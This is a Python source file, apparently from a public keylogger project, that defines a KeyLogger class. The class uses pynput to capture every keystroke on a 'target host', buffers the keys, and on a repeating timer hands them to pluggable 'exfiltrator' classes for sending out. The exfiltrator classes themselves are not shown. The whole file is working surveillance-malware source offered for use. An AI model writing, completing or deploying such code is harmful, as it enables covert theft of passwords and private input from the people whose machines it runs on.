#!/usr/bin/env python3
# https://github.com/EONRaider/Keylogger

__author__ = "EONRaider @ keybase.io/eonraider"

import contextlib
from threading import Timer

from pynput import keyboard


class KeyLogger(object):
    def __init__(self, *,
                 start_message: str = "Keylogger Initialized",
                 exfil_time: [int, float]):
        """Set up a keyboard listener that monitors keystroke events
        and send them to pre-configured exfiltration methods.

        Args:
            start_message (str): An initial message that will be sent
                through all exfiltrators by the keylogger upon
                activation. Useful as a signal that the service is
                active.
            exfil_time (int,float): Time in seconds to wait before
                executing the exfiltration of logged keystrokes.
        """

        self.exfil_time = exfil_time
        self.exfil_buffer: list[str] = [start_message]
        self.__exfiltrators = list()
        '''Mapping of key names to string characters for human-readable 
        text output. Add more mappings as necessary depending on the 
        host and the character set it works with.'''
        self.key_mapping: dict[str: str] = {"space": " "}

    @property
    def contents(self) -> str:
        """Get a string representation of the data buffered by the
        keylogger for exfiltration."""
        return "".join(self.exfil_buffer)

    @property
    def has_data(self) -> bool:
        """Returns True if the keylogger has data ready for exfiltration
        and False otherwise."""
        return bool(len(self.exfil_buffer))

    def register_exfiltrator(self, exfiltrator) -> None:
        """Register an instance of a child-class of Exfiltrator as an
        observer, enabling output or exfiltration of captured data from
        the target host."""
        self.__exfiltrators.append(exfiltrator)

    def _notify_all_exfiltrators(self) -> None:
        """Send captured data to each registered observer for final
        exfiltration."""
        [exfiltrator.update() for exfiltrator in self.__exfiltrators]
        Timer(interval=self.exfil_time,
              function=self._notify_all_exfiltrators).start()
        self.exfil_buffer.clear()

    def _on_press(self, key: keyboard.Key) -> None:
        """Add the string representation of each keystroke captured
        'on press' by the listener thread to the exfiltration buffer."""
        try:  # A key was pressed and caught by the listener
            pressed_key: str = key.char  # The key is alphanumeric
        except AttributeError:  # The key is special
            try:  # Translate the key's value through custom mapping...
                pressed_key = self.key_mapping[key.name]
            except KeyError:  # ... or use the key's name as a result
                try:  # The special key is valid and has a name...
                    pressed_key = f"[{key.name.upper()}]"
                except AttributeError:  # ... or is unknown
                    pressed_key = "[???]"
        self.exfil_buffer.append(pressed_key)

    def _on_release(self, key: keyboard.Key) -> None:
        ...

    def execute(self) -> None:
        with keyboard.Listener(on_press=self._on_press,
                               on_release=self._on_release) as listener:
            with contextlib.suppress(KeyboardInterrupt):
                self._notify_all_exfiltrators()
                listener.join()
